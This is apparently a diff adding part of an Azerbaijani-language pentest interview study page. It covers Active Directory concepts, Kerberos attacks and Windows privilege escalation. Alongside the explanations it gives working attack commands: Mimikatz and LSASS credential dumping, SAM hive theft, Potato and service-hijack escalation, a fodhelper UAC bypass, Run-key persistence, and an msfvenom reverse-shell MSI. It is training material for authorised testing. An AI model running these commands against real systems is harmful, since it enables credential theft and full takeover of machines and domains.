+<p>OU – Domain daxilində obyektləri qruplaşdırmaq və idarə etmək üçün istifadə olunan struktur konteynerdir (“qovluq” kimi).</p>
+<h4 class="sub">Nə üçün istifadə olunur?</h4>
+<ul class="blist">
+<li>Təşkil etmək (user/computer bölmək – IT, HR, Finance).</li>
+<li>GPO tətbiq etmək (ən vacib).</li>
+<li>Delegation (icazə vermək – HR OU-nu HR admin idarə etsin).</li>
+</ul>
+<p>Vacib: OU security boundary DEYİL – OU-lar arasında real təhlükəsizlik sərhədi yoxdur; domain admin bütün OU-lara girə bilər.</p>
+</div></article>
+<article class="qa" id="q99">
+<div class="qa-q"><span class="badge">Sual 99</span><h3>AD-nin fiziki strukturu nədir (DC, Site)?</h3></div>
+<div class="qa-a">
+<p>Logical struktur “kim kimdir”, physical struktur “harada yerləşir və necə əlaqə qurur”. Fiziki struktur əsasən 2 elementdən ibarətdir:</p>
+<ul class="blist">
+<li>Domain Controller (DC) – AD-ni saxlayan və idarə edən server: authentication, authorization, AD database (NTDS.dit), replication. Bir domain-də bir neçə DC ola bilər (redundancy).</li>
+<li>Site (Sayt) – eyni şəbəkədə (subnet-də) olan cihazların qrupu; müxtəlif ofisləri ayırmaq, replication-u optimallaşdırmaq, login-i sürətləndirmək.</li>
+</ul>
+</div></article>
+<article class="qa" id="q100">
+<div class="qa-q"><span class="badge">Sual 100</span><h3>AD-də hansı admin qrupları var?</h3></div>
+<div class="qa-a">
+<ul class="blist">
+<li>Enterprise Admins – ən yüksək (forest səviyyəsi).</li>
+<li>Domain Admins – domain səviyyəsi, çox güclü.</li>
+<li>Administrators.</li>
+<li>Server Operators.</li>
+<li>Account Operators.</li>
+<li>Backup Operators (dangerous ola bilər).</li>
+<li>DNSAdmins (exploit edilə bilər).</li>
+</ul>
+</div></article>
+<article class="qa" id="q101">
+<div class="qa-q"><span class="badge">Sual 101</span><h3>Local Admin, Domain Admin və Enterprise Admin fərqi nədir?</h3></div>
+<div class="qa-a">
+<ul class="blist">
+<li>Local Admin – tək kompüter; lokal user/proqramlar; AD/DC access yox.</li>
+<li>Domain Admin – 1 domain; user/PC/server idarə edir; AD və DC access var; pentest dəyəri çox yüksək.</li>
+<li>Enterprise Admin – bütün forest; bütün domain-lər; trust idarə edir; forest level GPO; ən yüksək (MAX) səviyyə.</li>
+</ul>
+</div></article>
+<article class="qa" id="q102">
+<div class="qa-q"><span class="badge">Sual 102</span><h3>Workgroup nədir?</h3></div>
+<div class="qa-a">
+<p>Workgroup – mərkəzi idarəetməsi olmayan, sadə şəbəkə modelidir (“hər kompüter öz-özünü idarə edir”).</p>
+<ul class="blist">
+<li>Hər PC-də ayrı user-lər olur.</li>
+<li>Mərkəzi server (Domain Controller) yoxdur.</li>
+<li>Login lokal olaraq edilir.</li>
+<li>Paylaşım manual verilir, security zəifdir.</li>
+<li>Kiçik şəbəkələr üçün.</li>
+</ul>
+</div></article>
+<article class="qa" id="q103">
+<div class="qa-q"><span class="badge">Sual 103</span><h3>Global Catalog (GC) nədir?</h3></div>
+<div class="qa-a">
+<p>Global Catalog – Forest daxilində bütün obyektlər haqqında qismən (partial) məlumat saxlayan xüsusi Domain Controller-dir (“forest-in indeks bazası”). User-lərin bəzi atributlarını (email, username), qrupları saxlayır. Axtarış zamanı user-in hansı domain-də olduğunu deyir. Portlar: 3268 (normal), 3269 (secure).</p>
+</div></article>
+<article class="qa" id="q104">
+<div class="qa-q"><span class="badge">Sual 104</span><h3>FSMO rolları hansılardır və ən vacibi hansıdır?</h3></div>
+<div class="qa-a">
+<p>FSMO (Flexible Single Master Operations) – AD-də bəzi kritik əməliyyatları yalnız tək bir server idarə edir. 5 rol var:</p>
+<h4 class="sub">Domain səviyyəsində</h4>
+<ul class="blist">
+<li>PDC Emulator – password dəyişikliyi, time sync, account lockout (ən vacib).</li>
+<li>RID Master – user-lərə SID/RID verir.</li>
+<li>Infrastructure Master – cross-domain referansları yeniləyir.</li>
+</ul>
+<h4 class="sub">Forest səviyyəsində</h4>
+<ul class="blist">
+<li>Schema Master – AD strukturunu dəyişir (yeni attribute).</li>
+<li>Domain Naming Master – yeni domain əlavə edir.</li>
+</ul>
+<p>Ən kritik: PDC Emulator – AD-in ürəyi; down olsa login problemləri, password sync gecikməsi, Kerberos problemləri yaranır.</p>
+</div></article>
+<article class="qa" id="q105">
+<div class="qa-q"><span class="badge">Sual 105</span><h3>NTLM və Kerberos necə işləyir, fərqi nədir?</h3></div>
+<div class="qa-a">
+<p>NTLM (köhnə) – challenge-response sistemi: user login istəyir, server random challenge verir, user parolundan hash yaradıb challenge ilə cavab verir, server eyni hesablamanı edir. Parol açıq getmir, amma hash istifadə olunur. Risk: hash tutulsa istifadə edilə bilər (replay/relay).</p>
+<p>Kerberos (əsas) – ticket-based authentication. KDC (DC üzərində) idarə edir.</p>
+<ul class="blist">
+<li>Login: User → DC, DC TGT (Ticket Granting Ticket) verir.</li>
+<li>Service istəyi: User → DC, DC TGS (service ticket) verir.</li>
+<li>Service access: User → server, ticket təqdim edir.</li>
+</ul>
+<p>NTLM vs Kerberos: NTLM challenge-response/zəif/relay attack; Kerberos ticket/güclü/default AD/ticket abuse (Kerberoasting, AS-REP roasting, Pass-the-ticket, Golden/Silver Ticket).</p>
+</div></article>
+<article class="qa" id="q106">
+<div class="qa-q"><span class="badge">Sual 106</span><h3>LDAP nədir?</h3></div>
+<div class="qa-a">
+<p>LDAP (Lightweight Directory Access Protocol) – AD məlumatını oxumaq üçün protokoldur (“AD database-ə sual vermək yolu”). Onunla user, group, OU, SPN, privilege məlumatı tapılır.</p>
+<p>DC üzərində işləyir; portlar: 389 (LDAP), 636 (LDAPS). Pentestdə information gathering xəzinəsidir (user/group enum, privilege mapping, attack surface).</p>
+</div></article>
+<article class="qa" id="q107">
+<div class="qa-q"><span class="badge">Sual 107</span><h3>Trust Relationship nədir və növləri hansılardır?</h3></div>
+<div class="qa-a">
+<p>Trust – iki domain/forest arasında güvən əlaqəsidir (“sənin userlərinə güvənirəm, mənim resurslara daxil ola bilər”). Resurs paylaşımı, multi-domain/forest idarəetmə üçün lazımdır.</p>
+<h4 class="sub">Növləri</h4>
+<ul class="blist">
+<li>Parent-Child – avtomatik, transitive, two-way.</li>
+<li>Tree-Root – eyni forest fərqli tree-lər, transitive, two-way.</li>
+<li>External – fərqli forest, non-transitive, one/two-way.</li>
+<li>Forest – iki forest arası, transitive, one/two-way.</li>
+<li>Shortcut – uzun trust yolunu qısaltmaq (manual, performans).</li>
+<li>Realm – Kerberos realm-lər arası (AD ↔ Linux/Unix).</li>
+</ul>
+<h4 class="sub">Xüsusiyyətlər</h4>
+<ul class="blist">
+<li>Transitive: A↔B↔C → A↔C də işləyir; Non-transitive: yalnız birbaşa.</li>
+<li>One-way: yalnız bir tərəf güvənir; Two-way: hər iki tərəf.</li>
+</ul>
+<p>Pentest: lateral movement, privilege escalation, SID History attack, cross-domain Golden Ticket.</p>
+</div></article>
+<article class="qa" id="q108">
+<div class="qa-q"><span class="badge">Sual 108</span><h3>GPO (Group Policy Object) nədir və kimə verilir?</h3></div>
+<div class="qa-a">
+<p>GPO – AD-də user və computer-lərə verilən qaydalar sistemidir (USB blokla, firewall aç, proqram quraşdır, password policy ver).</p>
+<p>GPO birbaşa userə verilmir; Site, Domain və ya OU-ya link olunur. User hansı OU-dadırsa, o OU-dakı GPO ona tətbiq olunur.</p>
+<ul class="blist">
+<li>User Configuration – user login olanda tətbiq olunur.</li>
+<li>Computer Configuration – kompüter boot olanda tətbiq olunur.</li>
+</ul>
+<p>Pentest: GPO attack surface-dir – startup/logon script abuse, SYSVOL leak, GPP password.</p>
+</div></article>
+<article class="qa" id="q109">
+<div class="qa-q"><span class="badge">Sual 109</span><h3>AD-də əsas servis portları hansılardır?</h3></div>
+<div class="qa-a">
+<ul class="blist">
+<li>Kerberos 88 (TCP/UDP), Kerberos password change 464.</li>
+<li>LDAP 389, LDAPS 636.</li>
+<li>Global Catalog 3268, GC Secure 3269.</li>
+<li>SMB 445.</li>
+<li>RPC 135, RPC Dynamic 49152–65535.</li>
+<li>DNS 53.</li>
+<li>NTP 123 (Kerberos üçün vacib).</li>
+<li>RDP 3389, WinRM 5985 (HTTP) / 5986 (HTTPS).</li>
+</ul>
+<p>Core 4 port: 88 (Kerberos), 389 (LDAP), 445 (SMB), 53 (DNS). Scan: nmap -p 88,389,445,135,3268 target.</p>
+</div></article>
+<article class="qa" id="q110">
+<div class="qa-q"><span class="badge">Sual 110</span><h3>Kerberos necə işləyir (addım-addım)?</h3></div>
+<div class="qa-a">
+<p>Kerberos – şəbəkədə təhlükəsiz login üçün ticket-based protokoldur (parol birbaşa göndərilmir, ticket istifadə olunur). KDC: AS (Authentication Server) + TGS (Ticket Granting Server), DC içində işləyir.</p>
+<ul class="blist">
+<li>AS-REQ: user username+password göndərir.</li>
+<li>AS-REP: server TGT verir (user password hash ilə şifrəli).</li>
+<li>TGS-REQ: user service üçün ticket istəyir.</li>
+<li>TGS-REP: server Service Ticket verir (service account password ilə şifrəli).</li>
+<li>AP-REQ: user service-ə ticket təqdim edir.</li>
+<li>Access: service ticket-i yoxlayır, icazə verir.</li>
+</ul>
+<p>TGT login zamanı alınır; Service Ticket konkret service üçün (SPN ilə bağlı); ticket-lərin lifetime-ı var.</p>
+</div></article>
+<article class="qa" id="q111">
+<div class="qa-q"><span class="badge">Sual 111</span><h3>Kerberos əsaslı hücumlar hansılardır?</h3></div>
+<div class="qa-a">
+<ul class="blist">
+<li>Kerberoasting – SPN olan service-lərdən ticket alıb hash crack etmək.</li>
+<li>AS-REP Roasting – pre-auth söndürülmüş hesablardan hash almaq.</li>
+<li>Pass-the-Ticket – ticket oğurlayıb başqa user kimi istifadə.</li>
+<li>Golden Ticket – fake TGT yaratmaq, domain admin kimi girmək.</li>
+<li>Silver Ticket – fake service ticket, konkret serverə giriş.</li>
+</ul>
+</div></article>
+<article class="qa" id="q112">
+<div class="qa-q"><span class="badge">Sual 112</span><h3>SPN və UPN nədir, fərqi nədir?</h3></div>
+<div class="qa-a">
+<p>UPN (User Principal Name) – istifadəçinin login adı (email formatında: admin@rs.local). Login zamanı və useri unikal tanımaq üçün.</p>
+<p>SPN (Service Principal Name) – servislər üçün kimlikdir (service/hostname: MSSQLSvc/server1.rs.local:1433, HTTP/web.rs.local). Kerberos hansı servislə danışdığını bilsin deyə istifadə olunur. AD-də user/computer account atributunda saxlanır.</p>
+<ul class="blist">
+<li>UPN: user-ə aid, user@domain, login üçün; pentest: brute-force, phishing.</li>
+<li>SPN: service-ə aid, service/host, service auth üçün; pentest: Kerberoasting.</li>
+</ul>
+<p>Kerberoasting məntiqi: SPN olan account = service account; sən Kerberos-dan ticket alırsan (service account password hash ilə şifrəli), hash-i offline crack edirsən (hashcat). Tools: GetUserSPNs.py, setspn -T domain -Q */*.</p>
+</div></article>
+<article class="qa" id="q113">
+<div class="qa-q"><span class="badge">Sual 113</span><h3>Golden, Silver və Diamond Ticket nədir, fərqləri nələrdir?</h3></div>
+<div class="qa-a">
+<p>Golden Ticket – ən güclü; domain-in master key-i (KRBTGT account hash) istifadə olunur. İstənilən user kimi görünmək, istənilən serverə girmək, domain admin olmaq mümkündür (“bütün binanın master açarı”).</p>
+<p>Silver Ticket – daha kiçik scope; tək bir service-in key-si (service account hash – CIFS, HTTP, MSSQL) istifadə olunur. Yalnız konkret service-ə giriş; domain admin olmur (“tək otağın açarı”). Stealth: DC ilə danışmır, offline yaradılır, loglarda az görünür.</p>
+<p>Diamond Ticket – Golden Ticket-in “clean” versiyası; KRBTGT hash + əlavə legit AD request ilə yaradılır. Daha az detect olunur, real Kerberos traffic yaradır (“master açar, amma kamera şübhələnmir”).</p>
+<ul class="blist">
+<li>Golden: whole domain, KRBTGT hash, limitsiz.</li>
+<li>Silver: single service, service account hash, tək servis.</li>
+<li>Diamond: whole domain (stealth), KRBTGT + real request pattern.</li>
+</ul>
+</div></article>
+<article class="qa" id="q114">
+<div class="qa-q"><span class="badge">Sual 114</span><h3>Delegation nədir və növləri hansılardır?</h3></div>
+<div class="qa-a">
+<p>Delegation – bir istifadəçinin və ya servisin başqa istifadəçi adından hərəkət etməsinə icazə verən AD funksiyasıdır (“on behalf of”). Servislər bir-biri ilə danışanda (Web → DB) hər dəfə credential göndərmək əvəzinə istifadə olunur.</p>
+<ul class="blist">
+<li>Unconstrained Delegation – server gələn user-in TGT-sini saxlayır və istənilən servisə user adından girə bilər. Çox təhlükəlidir (server kompromis olsa Domain Admin kimi hərəkət, Pass-the-Ticket). AD atributu: TRUSTED_FOR_DELEGATION (Win 2000).</li>
+<li>Constrained Delegation – yalnız əvvəlcədən təyin edilmiş spesifik servislərə icazə (S4U2Self, S4U2Proxy). AD atributu: msDS-AllowedToDelegateTo (Win 2003). Risk: orta.</li>
+<li>Resource-Based Constrained Delegation (RBCD) – icazəni target resource özü təyin edir. AD atributu: msDS-AllowedToActOnBehalfOfOtherIdentity (Win 2012). Domain Admin lazım deyil; düzgün konfiqurasiyada risk aşağı, amma abuse üçün çox güclü.</li>
+</ul>
+</div></article>
+<article class="qa" id="q115">
+<div class="qa-q"><span class="badge">Sual 115</span><h3>Delegation növlərinin qorunma tədbirləri hansılardır?</h3></div>
+<div class="qa-a">
+<ul class="blist">
+<li>Unconstrained üçün: serverləri “Protected Users” qrupuna əlavə et; “Account is sensitive and cannot be delegated” bayrağı; mümkünsə tamamilə söndür.</li>
+<li>Constrained üçün: msDS-AllowedToDelegateTo atributlarını audit et; kritik servislərə (LDAP, CIFS/DC) delegasiyadan çəkin.</li>
+<li>RBCD üçün: MachineAccountQuota-nı 0-a endir (ən vacib); msDS-AllowedToActOnBehalfOfOtherIdentity-ni monitor et; privileged hesabları “Protected Users”-ə əlavə et.</li>
+</ul>
+<p>RBCD Attack (MachineAccountQuota Abuse): default olaraq domain user 10 kompüter hesabı yarada bilir; hacker fake machine account yaradır, target serverin atributunu dəyişir, S4U2Self + S4U2Proxy ilə Administrator adından bilet alır → server kompromis.</p>
+</div></article>
+<article class="qa" id="q116">
+<div class="qa-q"><span class="badge">Sual 116</span><h3>CIFS nədir?</h3></div>
+<div class="qa-a">
+<p>CIFS (Common Internet File System) – şəbəkə üzərindən fayl və printer paylaşımı protokoludur (“başqa kompüterdəki fayllara sanki öz kompüterindəki kimi daxil olmaq”). Əslində SMB-nin köhnə versiyasıdır (SMB1 dövrü). Bu gün “SMB” deyilir, amma çox tool hələ də “CIFS” terminini istifadə edir.</p>
+<p>Pentestdə: anonymous access (\\server\share), credential leakage (config/backup/script), lateral movement, köhnə SMB exploitation. Domain mühitində login Kerberos, file access CIFS/SMB ilə olur. Tools: smbclient, smbmap, enum4linux, rpcclient.</p>
+</div></article>
+<article class="qa" id="q117">
+<div class="qa-q"><span class="badge">Sual 117</span><h3>Member Server, Domain Controller və DMZ nədir?</h3></div>
+<div class="qa-a">
+<ul class="blist">
+<li>Member Server – domain-ə qoşulmuş, amma DC olmayan server (file/web/SQL server). Auth üçün DC-dən istifadə edir. Pentest: lateral movement üçün ideal nöqtə.</li>
+<li>Domain Controller (DC) – domain-in ən kritik serveri; login (Kerberos), LDAP, AD database burada. Pentest: final hədəf (bütün userlər, hashlər, tam nəzarət).</li>
+<li>DMZ (Demilitarized Zone) – internet ilə daxili şəbəkə arasında izolyasiya zonası (web/mail server, reverse proxy). Məqsəd: internetə açıq serverləri qorumaq, daxili şəbəkəni ayırmaq.</li>
+</ul>
+<p>Klassik hücum yolu: DMZ server hack → internal-a pivot → member server → credential dump → DC-yə keçid.</p>
+</div></article>
+<article class="qa" id="q118">
+<div class="qa-q"><span class="badge">Sual 118</span><h3>AD harada işləyir (Windows, Linux, macOS)?</h3></div>
+<div class="qa-a">
+<p>Server tərəfi: AD yalnız Windows Server-də işləyir (2016/2019/2022/2025); DC həmişə Windows olur.</p>
+<p>Client tərəfi: AD-ə qoşulan cihazlar yalnız Windows olmaq məcburiyyətində deyil – Linux (SSSD, realmd, winbind), macOS, hətta printerlər, NAS, bəzi IoT cihazlar qoşula bilər.</p>
+<p>Alternativlər (Windows olmayan): OpenLDAP (saf LDAP), Samba AD (Linux üzərində AD DC kimi – Kerberos + LDAP + DNS emulyasiya).</p>
+</div></article>
+<article class="qa" id="q119">
+<div class="qa-q"><span class="badge">Sual 119</span><h3>C2 (Command and Control) nədir?</h3></div>
+<div class="qa-a">
+<p>C2 (Command and Control) – hücumçunun ələ keçirdiyi sistemləri uzaqdan idarə etdiyi mərkəzdir. Target maşına agent/beacon yerləşdirilir, o agent C2 serverə qoşulur, sən serverdən komandalar göndərirsən.</p>
+<ul class="blist">
+<li>Agent (Beacon) target maşında işləyir.</li>
+<li>C2 serverə qoşulur (HTTP/HTTPS).</li>
+<li>Komandalar göndərilir (whoami, ipconfig, ls) və nəticə geri gəlir.</li>
+</ul>
+<p>Alətlər: Cobalt Strike, Havoc, Metasploit, Sliver, Mythic. İstifadə: post-exploitation, stealth, persistence, lateral movement. Beacon = periodik “ping”; Listener = C2-də açıq port.</p>
+</div></article>
+<article class="qa" id="q120">
+<div class="qa-q"><span class="badge">Sual 120</span><h3>Mimikatz əsas komandaları hansılardır?</h3></div>
+<div class="qa-a">
+<ul class="blist">
+<li>privilege::debug – LSASS prosesinə giriş icazəsi (ilk addım).</li>
+<li>sekurlsa::logonpasswords – RAM-dan login məlumatları (username + NTLM hash).</li>
+<li>lsadump::lsa / lsadump::lsa /patch – LSA secrets dump.</li>
+<li>kerberos::list, kerberos::tickets – Kerberos ticket-ləri görmək/dump.</li>
+<li>kerberos::ptt &lt;ticket.kirbi&gt; – ticket inject (Pass-the-Ticket).</li>
+<li>sekurlsa::pth /user:admin /ntlm:&lt;hash&gt; – Pass-the-Hash.</li>
+<li>lsadump::sam – local SAM hash dump.</li>
+</ul>
+<p>Attack flow: privilege::debug → sekurlsa::logonpasswords → credential-lar → pass-the-hash/ticket → lateral movement → domain escalation. EDR/Defender LSASS access-i detect edir.</p>
+</div></article>
+<article class="qa" id="q121">
+<div class="qa-q"><span class="badge">Sual 121</span><h3>AD enumeration və post-exploitation iş axını (workflow) necədir?</h3></div>
+<div class="qa-a">
+<ul class="blist">
+<li>Network Discovery – fping (canlı hostlar).</li>
+<li>Service Discovery – nmap -p 389,445,88,135 (AD portları).</li>
+<li>LDAP Enumeration – ldapsearch (user, group, OU, description).</li>
+<li>SMB Enumeration – enum4linux (user, share, password policy).</li>
+<li>Dərin analiz – rpcclient (SID→username, RID brute).</li>
+<li>Username doğrulama – Kerbrute (valid user).</li>
+<li>AS-REP Roasting – pre-auth OFF hesablardan hash crack.</li>
+<li>Registry – wmic, sc (privilege escalation, persistence: Run/RunOnce, Winlogon).</li>
+<li>Installed software – reg query (köhnə versiya = exploit).</li>
+</ul>
+<p>Mindset: “Harada credential ola bilər? Harada config səhvi var? Haradan SYSTEM ala bilərəm?”</p>
+</div></article>
+<div class="note"><span class="note-label">Qeyd</span><p>Windows Privilege Escalation — aşağı hüquqlu istifadəçidən və ya servis hesabından <strong>SYSTEM / Administrator</strong>-a, AD mühitində isə domen hakimiyyətinə doğru qalxmadır. Metodlar yalnız icazəli lab/pentest üçündür.</p></div>
+<article class="qa" id="q122">
+<div class="qa-q"><span class="badge">Sual 122</span><h3>Windows privesc nədir və enumeration necə aparılır?</h3></div>
+<div class="qa-a">
+<p>Windows privesc – cari istifadəçidən daha yüksək hüquqa (lokal Administrator və ya NT AUTHORITY\SYSTEM) keçməkdir. İlk addım enumeration-dır.</p>
+<h4 class="sub">Manual yoxlama</h4>
+<pre class="code"><code>whoami /all          # SID, qruplar, privilege-lər
+whoami /priv         # aktiv privilege-lər (Se...Privilege)
+systeminfo           # OS versiyası, hotfix-lər
+net user; net localgroup administrators
+ipconfig /all; netstat -ano</code></pre>
+<h4 class="sub">Avtomatik alətlər</h4>
+<ul class="blist">
+<li>winPEAS – ən geniş avtomatik enum (xidmət, registry, cred, patch).</li>
+<li>PowerUp.ps1 (PowerSploit) – PowerShell əsaslı zəiflik tapma.</li>
+<li>Seatbelt / SharpUp (.NET) – host enumeration.</li>
+<li>WES-NG / Watson – systeminfo əsasında uyğun exploit təklifi.</li>
+</ul>
+</div></article>
+<article class="qa" id="q123">
+<div class="qa-q"><span class="badge">Sual 123</span><h3>Token/privilege abuse — SeImpersonatePrivilege (Potato hücumları)?</h3></div>
+<div class="qa-a">
+<p>Servis hesabları (IIS <code>iis apppool</code>, MSSQL) çox vaxt <strong>SeImpersonatePrivilege</strong> daşıyır. Bu privilege ilə SYSTEM token-i təqlid edib (impersonate) SYSTEM almaq olar – buna “Potato” hücumları deyilir.</p>
+<ul class="blist">
+<li>JuicyPotato – köhnə Windows (Server 2016 / Win10 &lt;1809) üçün COM/DCOM istismarı.</li>
+<li>PrintSpoofer – Print Spooler vasitəsilə, yeni sistemlərdə işləyir.</li>
+<li>RoguePotato / GodPotato – müasir versiyalar üçün təkmilləşdirilmiş variantlar.</li>
+</ul>
+<pre class="code"><code>whoami /priv          # SeImpersonatePrivilege = Enabled?
+PrintSpoofer.exe -i -c cmd       # SYSTEM cmd
+GodPotato.exe -cmd "cmd /c whoami"</code></pre>
+</div></article>
+<article class="qa" id="q124">
+<div class="qa-q"><span class="badge">Sual 124</span><h3>SeBackup/SeRestore/SeTakeOwnership privilege istismarı?</h3></div>
+<div class="qa-a">
+<ul class="blist">
+<li><strong>SeBackupPrivilege</strong> – istənilən faylı oxumaq (icazəni bypass); SAM+SYSTEM hive-larını kopyalayıb hash çıxarmaq.</li>
+<li><strong>SeRestorePrivilege</strong> – istənilən faylı yazmaq/əvəzləmək (servis binari, DLL).</li>
+<li><strong>SeTakeOwnershipPrivilege</strong> – fayl sahibliyini götürüb icazəni dəyişmək.</li>
+</ul>
+<pre class="code"><code>reg save HKLM\SAM C:\Temp\sam.hive
+reg save HKLM\SYSTEM C:\Temp\system.hive
+# offline:
+secretsdump.py -sam sam.hive -system system.hive LOCAL</code></pre>
+<p>Çıxarılan NTLM hash-lar Pass-the-Hash və ya crack üçün istifadə olunur.</p>
+</div></article>
+<article class="qa" id="q125">
+<div class="qa-q"><span class="badge">Sual 125</span><h3>Unquoted Service Path nədir və necə istismar edilir?</h3></div>
+<div class="qa-a">
+<p>Servis yolu boşluq daşıyır və <strong>dırnaq içində deyilsə</strong> (məs. <code>C:\Program Files\My App\svc.exe</code>), Windows yolu hissələrə bölüb sıra ilə icra etməyə çalışır: əvvəlcə <code>C:\Program.exe</code>, sonra <code>C:\Program Files\My.exe</code> və s. Yazıla bilən qovluğa uyğun adlı zərərli exe qoymaq olar.</p>
+<pre class="code"><code>wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows"
+# Yazıla bilən yerə zərərli exe:
+copy payload.exe "C:\Program Files\My.exe"
+sc stop vuln &amp; sc start vuln</code></pre>
+</div></article>
+<article class="qa" id="q126">
+<div class="qa-q"><span class="badge">Sual 126</span><h3>Zəif Service icazələri ilə privesc (sc, accesschk)?</h3></div>
+<div class="qa-a">
+<p>İstifadəçi servisin konfiqurasiyasını dəyişə bilirsə (SERVICE_CHANGE_CONFIG), <code>binPath</code>-i öz payload-una yönəldib servisi restart etməklə SYSTEM alınır. Servis binarisi writable olduqda isə birbaşa əvəzlənir.</p>
+<pre class="code"><code>accesschk.exe -uwcqv "Users" *        # yazıla bilən servislər
+sc qc vuln                            # konfiqurasiya
+sc config vuln binpath= "C:\Temp\payload.exe"
+sc stop vuln &amp; sc start vuln</code></pre>
+<p>PowerUp.ps1: <code>Invoke-AllChecks</code> bu vektorları avtomatik tapır.</p>
+</div></article>
+<article class="qa" id="q127">
+<div class="qa-q"><span class="badge">Sual 127</span><h3>AlwaysInstallElevated nədir?</h3></div>
+<div class="qa-a">
+<p>Hər iki registry açarı (HKLM və HKCU) <code>1</code>-dirsə, istənilən istifadəçi <strong>.msi</strong> paketini SYSTEM hüququ ilə quraşdıra bilər.</p>
+<pre class="code"><code>reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+# Hər ikisi 0x1 olduqda:
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=.. LPORT=.. -f msi -o evil.msi
+msiexec /quiet /qn /i evil.msi</code></pre>
+</div></article>
+<article class="qa" id="q128">
+<div class="qa-q"><span class="badge">Sual 128</span><h3>DLL Hijacking ilə privesc necədir?</h3></div>
+<div class="qa-a">
+<p>Yüksək hüquqlu proses DLL-i tam yol vermədən yükləyirsə və axtarış sırasındakı qovluqlardan biri <strong>yazıla bilirsə</strong>, eyni adlı zərərli DLL qoyub icra etdirmək olar (DLL search-order hijacking / missing DLL).</p>
+<ul class="blist">
+<li>ProcMon ilə “NAME NOT FOUND” olan DLL yükləmələrini tap.</li>
+<li>Yazıla bilən qovluğu (PATH-də) müəyyən et.</li>
+<li>DllMain içində payload olan DLL yarat və yerləşdir.</li>
+</ul>
+<pre class="code"><code>msfvenom -p windows/x64/exec CMD="cmd.exe" -f dll -o hijack.dll</code></pre>
+</div></article>
+<article class="qa" id="q129">
+<div class="qa-q"><span class="badge">Sual 129</span><h3>Saxlanılan credential-lar (cmdkey, SAM, LSASS, AutoLogon)?</h3></div>
+<div class="qa-a">
+<p>Çox vaxt sistemdə açıq və ya hash şəklində saxlanan parollar privesc üçün kifayətdir.</p>
+<ul class="blist">
+<li>cmdkey /list – saxlanmış cred-lər; <code>runas /savecred</code> ilə istifadə.</li>
+<li>AutoLogon – <code>reg query "HKLM\...\Winlogon"</code> → DefaultUserName/DefaultPassword.</li>
+<li>SAM + SYSTEM – lokal hash-lar (secretsdump).</li>
+<li>LSASS dump – mimikatz / comsvcs.dll ilə yaddaşdan plaintext/NTLM.</li>
+<li>Unattend / sysprep – <code>unattend.xml</code>, <code>Groups.xml</code> (GPP cpassword).</li>
+</ul>
+<pre class="code"><code>cmdkey /list
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+rundll32 comsvcs.dll, MiniDump &lt;lsass_pid&gt; C:\Temp\lsass.dmp full</code></pre>
+</div></article>
+<article class="qa" id="q130">
+<div class="qa-q"><span class="badge">Sual 130</span><h3>Scheduled Tasks ilə privesc necədir?</h3></div>
+<div class="qa-a">
+<p>Yüksək hüquqla işləyən planlaşdırılmış tapşırığın çağırdığı script/binari yazıla bilirsə, onu əvəzləyib tapşırıq işləyəndə SYSTEM almaq olar.</p>
+<pre class="code"><code>schtasks /query /fo LIST /v
+# tapşırığın Task To Run yolu writable-dirsə:
+accesschk.exe -quvw "C:\Tasks\job.bat"
+echo payload &gt; C:\Tasks\job.bat</code></pre>
+</div></article>
+<article class="qa" id="q131">
+<div class="qa-q"><span class="badge">Sual 131</span><h3>Registry AutoRun və zəif registry icazələri?</h3></div>
+<div class="qa-a">
+<p>AutoRun açarları (Run/RunOnce) yazıla bilirsə, administrator login etdikdə işləyəcək binarini əvəzləmək olar.</p>
+<pre class="code"><code>reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+accesschk.exe -uvwqk "Users" HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+reg add HKLM\...\Run /v evil /t REG_SZ /d "C:\Temp\payload.exe"</code></pre>
+<p>Eyni məntiq autorun binarisinin özü writable olduqda da işləyir.</p>
+</div></article>
+<article class="qa" id="q132">
+<div class="qa-q"><span class="badge">Sual 132</span><h3>UAC bypass nədir?</h3></div>
+<div class="qa-a">
+<p>İstifadəçi administrator qrupundadır, lakin proses medium integrity-də işləyir. UAC bypass medium-dan high integrity-ə (tam admin token) keçməyə imkan verir.</p>
+<ul class="blist">
+<li>fodhelper.exe – registry (ms-settings) hijack ilə auto-elevate bypass.</li>
+<li>eventvwr.exe – mscfile registry açarı ilə bypass.</li>
+<li>UACME (akagi) – çoxsaylı bypass texnikalarının toplusu.</li>
+</ul>
+<pre class="code"><code>reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
+reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /f
+fodhelper.exe</code></pre>
+</div></article>
+<article class="qa" id="q133">
+<div class="qa-q"><span class="badge">Sual 133</span><h3>Windows kernel exploit-ləri və attack chain xülasəsi?</h3></div>
+<div class="qa-a">
+<h4 class="sub">Məşhur exploit-lər</h4>
+<ul class="blist">
+<li>CVE-2021-1675 / CVE-2021-34527 (PrintNightmare) – Print Spooler RCE/LPE.</li>
+<li>CVE-2021-36934 (HiveNightmare/SeriousSAM) – SAM oxuma icazəsi.</li>
+<li>CVE-2020-0796 (SMBGhost) – SMBv3 lokal/uzaq.</li>
+<li>CVE-2016-0099 (MS16-032) – secondary logon privesc.</li>
+</ul>
+<h4 class="sub">Ümumi iş axını</h4>
+<ul class="blist">
+<li>1. Enum: whoami /priv, winPEAS, systeminfo.</li>
+<li>2. Privilege abuse: SeImpersonate → Potato; SeBackup → SAM.</li>
+<li>3. Servis/registry/task səhv konfiqurasiyası.</li>
+<li>4. Saxlanan cred-lər (cmdkey, LSASS, GPP, AutoLogon).</li>
+<li>5. Son çarə: systeminfo + WES-NG → uyğun kernel exploit.</li>
+<li>6. AD-yə keçid: lokal admin/SYSTEM-dən sonra mimikatz, BloodHound, lateral movement.</li>
+</ul>
+</div></article>
+</section>
+<section class="cat-section" id="cat7">
+<header class="cat-head"><span class="cat-head-num">07</span><h2>Pivoting, Proxy və Port Forwarding</h2></header>
+<article class="qa" id="q134">
+<div class="qa-q"><span class="badge">Sual 134</span><h3>Proxy, SOCKS Proxy və Reverse Proxy nədir?</h3></div>
+<div class="qa-a">
